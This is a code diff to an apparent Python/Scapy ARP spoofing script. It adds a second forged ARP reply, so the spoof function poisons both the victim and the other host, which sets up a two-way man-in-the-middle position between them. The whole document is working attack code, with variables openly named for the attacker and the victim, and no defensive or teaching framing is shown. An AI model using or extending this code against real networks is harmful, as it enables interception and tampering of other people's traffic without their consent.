@@ -10,7 +10,19 @@ def spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, interface):
     arp[ARP].hwdst = mac_victim
     arp[ARP].pdst = ip_victim
 
-    arp.show()
+    # arp.show()
+
+    sendp(arp, iface=interface)
+
+    arp = Ether() / ARP()
+    # arp[Ether].src = mac_attacker
+    # arp[Ether].dst = mac_victim
+    arp[ARP].hwsrc = mac_attacker
+    arp[ARP].psrc = ip_victim
+    arp[ARP].hwdst = get_mac(ip_to_spoof, interface)
+    arp[ARP].pdst = ip_to_spoof
+
+    # arp.show()
 
     sendp(arp, iface=interface)
 
@@ -24,5 +36,3 @@ def get_mac(ip, interface):
         return received.src
     else:
         print('MAC address of ip {ip} not found.'.format(ip=ip))
-
-
